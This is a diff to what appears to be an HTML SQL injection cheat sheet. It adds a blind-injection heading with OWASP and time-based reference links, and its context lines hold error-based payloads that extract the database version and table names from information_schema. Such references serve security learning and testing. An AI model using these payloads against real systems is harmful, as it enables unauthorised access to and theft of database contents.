@@ -67,7 +67,9 @@ AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)
 
 <b>Table</b><br>
 AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (table_name) from information_schema.tables where table_schema=database() limit 0,1),0x3a,FLOOR(RAND(0)*2)) x<br> FROM information_schema.tables GROUP BY x) y)<br>
-
+<h2>BLind</h2><br>
+<a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">https://owasp.org/www-community/attacks/Blind_SQL_Injection</a><br>
+<a href="https://www.sqlinjection.net/time-based/">https://www.sqlinjection.net/time-based/</a><br>
 <h2>Boolean Based Blind</h2>
 <b>Intro</b><br>
 select substr('abcde',1,1);<br>
